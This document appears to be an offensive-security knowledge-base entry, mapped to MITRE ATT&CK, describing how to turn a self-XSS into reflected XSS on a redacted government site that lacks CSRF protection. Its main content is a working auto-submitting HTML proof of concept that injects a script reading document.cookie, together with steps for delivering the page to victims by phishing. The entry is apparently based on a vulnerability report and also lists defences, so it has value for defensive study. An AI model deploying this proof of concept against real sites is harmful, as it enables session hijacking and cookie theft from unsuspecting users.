---
id: proc-escalate-reflected-xss-csrf
tags:
  - csrf
  - reflected-xss
  - escalation
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:15:41.678Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Escalate-to-Reflected-XSS-via-CSRF

## Summary

This procedure escalates the self-XSS vulnerability to reflected XSS by exploiting the absence of CSRF protection, crafting an HTML PoC that auto-submits the malicious form from a cross-origin context, forcing execution in any victim's authenticated browser session.

## Description

The form endpoint https://██████████/ lacks CSRF tokens, allowing cross-site POST requests. By hosting an HTML page with hidden form fields containing the XSS payload and auto-submit script, an attacker tricks victims into loading it (e.g., via phishing link). This leads to reflected XSS execution, stealing cookies or hijacking sessions. Prerequisites: Knowledge of the target form structure; victim must visit the PoC while logged in. Expected outcome: Arbitrary JS runs in victim's context without their direct interaction.

## Requirements

1. Text editor to create HTML PoC
2. Web server or file hosting to deliver PoC
3. Victim with active session on the DoD site

## Defense

Defensive measures and detection strategies:

- Implement CSRF tokens in all state-changing forms
- Enforce same-origin policy strictly with CORS headers
- Log and monitor cross-origin requests to form endpoints

## Objectives

1. Craft and deliver CSRF PoC for form submission
2. Achieve reflected XSS in victim browser
3. Enable session theft or data exfiltration

## Instructions

### Step 1: Craft the CSRF HTML PoC

**Context**: Create an HTML file that embeds the form with XSS payload and auto-submits it.

No command; manually write:

```html
<html><body><form action="https://██████████/" method="POST" id="csrf-poc"><input type="hidden" name="first_name" value='test"; <script>alert(document.cookie)</script>'><input type="hidden" name="middle_name" value=""><input type="hidden" name="last_name" value=""></form><script>document.getElementById('csrf-poc').submit();</script></body></html>
```

> Save as poc.html; the script submits immediately upon load.

### Step 2: Host or Deliver the PoC

**Context**: Make the PoC accessible to the victim via link or email.

Host on a server (e.g., GitHub Pages) or send as attachment. No specific command; use any file sharing method.

> Victim loads the page, triggering auto-submission and XSS.

### Step 3: Verify Escalation

**Context**: Observe execution in a test victim's browser.

Load the PoC in a browser with an active DoD session.

> Expected: Alert with victim's cookies; confirms escalation from self-XSS.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[reflected-xss]]
- [[web-exploit]]
